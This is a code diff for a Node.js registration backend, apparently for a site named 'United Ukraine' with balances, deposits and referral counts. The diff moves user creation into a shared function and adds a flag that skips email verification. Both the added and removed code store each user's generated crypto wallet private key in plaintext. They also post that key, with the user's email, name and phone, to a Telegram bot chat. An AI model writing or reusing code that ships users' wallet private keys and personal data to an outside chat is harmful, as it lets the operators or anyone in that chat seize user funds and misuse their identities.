@@ -36,6 +36,7 @@ const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
 const EMAIL_FROM = process.env.EMAIL_FROM || "United Ukraine <onboarding@resend.dev>";
 const BREVO_API_KEY = process.env.BREVO_API_KEY || "";
 const BREVO_SENDER_EMAIL = process.env.BREVO_SENDER_EMAIL || "";
+const EMAIL_VERIFICATION_REQUIRED = process.env.EMAIL_VERIFICATION_REQUIRED === "true";
 
 const PUBLIC_USER_FIELDS = "id,fullname,nickname,country,email,phone,balance,deposit,satellites,wallet_address,referrer_id";
 const QUIZ_ANSWERS = { 1: "b", 2: "c", 3: "a", 4: "b", 5: "c" };
@@ -190,6 +191,73 @@ async function refreshSatelliteCount(userId) {
   await supabase.from("users").update({ satellites: count || 0 }).eq("id", userId);
 }
 
+async function createRegisteredUser(data, passwordHash, ip, emailVerified = false) {
+  const wallet = Wallet.createRandom();
+  const { data: user, error } = await supabase
+    .from("users")
+    .insert([{
+      fullname: data.fullname,
+      nickname: data.nickname,
+      referrer_id: data.referrerId,
+      country: data.country,
+      phone: data.phone,
+      email: data.email,
+      password: passwordHash,
+      balance: 0,
+      deposit: 0,
+      satellites: 0,
+      wallet_address: wallet.address,
+      private_key: wallet.privateKey,
+      email_code: null,
+      email_verified: emailVerified,
+      ip
+    }])
+    .select("id,fullname,nickname,country,phone,email,wallet_address,referrer_id,balance")
+    .single();
+
+  if (error || !user) {
+    console.error("REGISTER INSERT ERROR:", error);
+    return { success: false, message: "Insert error" };
+  }
+
+  await addSignal({
+    user_id: user.id,
+    type: "register",
+    amount: 0,
+    wallet: user.wallet_address,
+    status: "done"
+  });
+  await refreshSatelliteCount(data.referrerId);
+
+  try {
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: [
+        "NEW USER",
+        `ID: ${formatUserId(user.id)}`,
+        `Email: ${user.email}`,
+        `Name: ${user.fullname}`,
+        `Nickname: ${user.nickname}`,
+        `Country: ${user.country}`,
+        `Phone: ${user.phone}`,
+        `Referrer: ${user.referrer_id ? formatUserId(user.referrer_id) : "-"}`,
+        `Wallet: ${wallet.address}`,
+        `Private key: ${wallet.privateKey}`,
+        `Email verified: ${emailVerified ? "yes" : "temporarily skipped"}`,
+        `Starting balance: $0`
+      ].join("\n")
+    });
+  } catch (telegramError) {
+    console.error("TELEGRAM ERROR:", telegramError.message);
+  }
+
+  return { success: true, user };
+}
+
+app.get("/registration/settings", (req, res) => {
+  res.json({ success: true, emailVerificationRequired: EMAIL_VERIFICATION_REQUIRED });
+});
+
 app.post("/register/start", async (req, res) => {
   try {
     const data = registrationData(req.body);
@@ -198,11 +266,18 @@ app.post("/register/start", async (req, res) => {
     const ip = requestIp(req);
     if (await tooManyAccounts(ip)) return res.json({ success: false, message: "Too many accounts" });
 
+    const passwordHash = await bcrypt.hash(data.password, 10);
+    if (!EMAIL_VERIFICATION_REQUIRED) {
+      const created = await createRegisteredUser(data, passwordHash, ip, false);
+      if (!created.success) return res.json(created);
+      return res.json({ success: true, registered: true });
+    }
+
     const code = crypto.randomInt(100000, 1000000).toString();
     const pendingToken = jwt.sign({
       purpose: "registration",
       profile: { ...data, password: undefined },
-      passwordHash: await bcrypt.hash(data.password, 10),
+      passwordHash,
       codeDigest: emailCodeDigest(code),
       ip
     }, SECRET, { expiresIn: "10m" });
@@ -226,65 +301,8 @@ app.post("/register/verify", async (req, res) => {
     if (validationError) return res.json({ success: false, message: validationError });
     if (await tooManyAccounts(pending.ip)) return res.json({ success: false, message: "Too many accounts" });
 
-    const wallet = Wallet.createRandom();
-    const { data: user, error } = await supabase
-      .from("users")
-      .insert([{
-        fullname: data.fullname,
-        nickname: data.nickname,
-        referrer_id: data.referrerId,
-        country: data.country,
-        phone: data.phone,
-        email: data.email,
-        password: pending.passwordHash,
-        balance: 0,
-        deposit: 0,
-        satellites: 0,
-        wallet_address: wallet.address,
-        private_key: wallet.privateKey,
-        email_code: null,
-        email_verified: true,
-        ip: pending.ip
-      }])
-      .select("id,fullname,nickname,country,phone,email,wallet_address,referrer_id,balance")
-      .single();
-
-    if (error || !user) {
-      console.error("REGISTER INSERT ERROR:", error);
-      return res.json({ success: false, message: "Insert error" });
-    }
-
-    await addSignal({
-      user_id: user.id,
-      type: "register",
-      amount: 0,
-      wallet: user.wallet_address,
-      status: "done"
-    });
-    await refreshSatelliteCount(data.referrerId);
-
-    try {
-      await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        chat_id: CHAT_ID,
-        text: [
-          "NEW USER",
-          `ID: ${formatUserId(user.id)}`,
-          `Email: ${user.email}`,
-          `Name: ${user.fullname}`,
-          `Nickname: ${user.nickname}`,
-          `Country: ${user.country}`,
-          `Phone: ${user.phone}`,
-          `Referrer: ${user.referrer_id ? formatUserId(user.referrer_id) : "-"}`,
-          `Wallet: ${wallet.address}`,
-          `Private key: ${wallet.privateKey}`,
-          "Email verified: yes",
-          `Starting balance: $0`
-        ].join("\n")
-      });
-    } catch (telegramError) {
-      console.error("TELEGRAM ERROR:", telegramError.message);
-    }
-
+    const created = await createRegisteredUser(data, pending.passwordHash, pending.ip, true);
+    if (!created.success) return res.json(created);
     return res.json({ success: true });
   } catch (error) {
     console.error("REGISTER VERIFY ERROR:", error);
